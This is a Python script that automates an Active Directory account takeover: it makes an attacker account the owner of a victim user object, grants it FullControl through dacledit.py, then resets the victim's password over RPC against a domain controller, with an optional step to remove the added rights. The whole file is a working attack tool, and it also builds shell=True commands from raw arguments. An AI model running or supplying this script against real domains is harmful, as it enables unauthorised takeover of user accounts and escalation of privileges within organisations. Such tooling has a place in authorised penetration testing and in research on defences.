import subprocess
import argparse
import os

def run_command(command):
    """Runs a shell command and captures output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Error: {result.stderr}")
        else:
            print(result.stdout)
    except Exception as e:
        print(f"Exception occurred while running command: {e}")

def check_tools():
    """Checks if required scripts and binaries are available."""
    required_tools = ["owneredit.py", "dacledit.py"]
    for tool in required_tools:
        if not os.path.isfile(tool):
            print(f"Error: Required script {tool} not found in the current directory.")
            return False

    # Check if 'net' binary is available in PATH
    result = subprocess.run(["which", "net"], capture_output=True, text=True)
    if result.returncode != 0:
        print("Error: Required binary 'net' not found in PATH.")
        return False

    return True

def main():
    parser = argparse.ArgumentParser(description="Automate abuse of AD user permissions.")
    parser.add_argument("-d", "--domain", required=True, help="The domain name (e.g., yourdomain.local).")
    parser.add_argument("-u", "--attacker-user", required=True, help="The attacker username.")
    parser.add_argument("-p", "--attacker-password", required=True, help="The attacker password.")
    parser.add_argument("-vu", "--victim-user", required=True, help="The victim username.")
    parser.add_argument("-dc", "--domain-controller", required=True, help="The domain controller FQDN.")
    parser.add_argument("-np", "--new-password", required=True, help="The new password for the victim user.")
    args = parser.parse_args()

    # Check if required tools are available
    if not check_tools():
        return

    # Step 1: Change ownership of the victim's object
    print("[+] Changing ownership of the target user...")
    owner_command = (
        f"owneredit.py -action write -new-owner '{args.attacker_user}' -target '{args.victim_user}' "
        f"'{args.domain}/{args.attacker_user}:{args.attacker_password}'"
    )
    run_command(owner_command)

    # Step 2: Grant GenericAll permissions to the attacker
    print("[+] Granting GenericAll permissions to the attacker...")
    generic_all_command = (
        f"dacledit.py -action 'write' -rights 'FullControl' -principal '{args.attacker_user}' "
        f"-target '{args.victim_user}' '{args.domain}/{args.attacker_user}:{args.attacker_password}'"
    )
    run_command(generic_all_command)

    # Step 3: Change the password of the victim user
    print("[+] Changing the victim user's password...")
    password_change_command = (
        f"net rpc password '{args.victim_user}' '{args.new_password}' -U "
        f"'{args.domain}/{args.attacker_user}%{args.attacker_password}' -S '{args.domain_controller}'"
    )
    run_command(password_change_command)

    # Optional: Cleanup - Remove GenericAll permissions
    cleanup = input("[?] Do you want to remove the added permissions? (yes/no): ").strip().lower()
    if cleanup == "yes":
        print("[+] Removing GenericAll permissions...")
        cleanup_command = (
            f"dacledit.py -action 'remove' -rights 'FullControl' -principal '{args.attacker_user}' "
            f"-target '{args.victim_user}' '{args.domain}/{args.attacker_user}:{args.attacker_password}'"
        )
        run_command(cleanup_command)

    print("[+] Process complete. Use the new password for further actions.")

if __name__ == "__main__":
    main()
